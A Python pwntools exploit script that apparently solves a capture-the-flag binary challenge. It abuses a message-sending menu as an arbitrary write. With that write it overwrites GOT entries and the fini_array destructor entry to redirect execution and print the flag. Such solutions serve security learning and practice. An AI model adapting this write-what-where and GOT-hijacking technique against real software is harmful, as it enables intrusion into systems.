#!/usr/bin/env python3

from pwn import tube, remote, ELF
from pathlib import Path
import sys

binary = ELF(Path(__file__).parent / 'task')


def write(r: tube, what: int, where: int):
    r.sendlineafter(b"Choice:", b"1")
    r.sendlineafter(b"Enter text of the message:", hex(what).encode())
    r.sendlineafter(b"Enter destination of the message:", hex(where).encode())


with remote(sys.argv[1], sys.argv[2]) as r:
    write(r, binary.symbols[b'main'], binary.got[b'puts'])
    write(r, binary.symbols[b'spy_open'], binary.symbols[b'__do_global_dtors_aux_fini_array_entry'])
    write(r, binary.symbols[b'spy_print'], binary.got[b'strchrnul'])
    write(r, binary.plt[b'printf'], binary.got[b'puts'])
    r.recvuntil(b"I've sent your message!")
    print(r.recvuntil(b"}").decode())
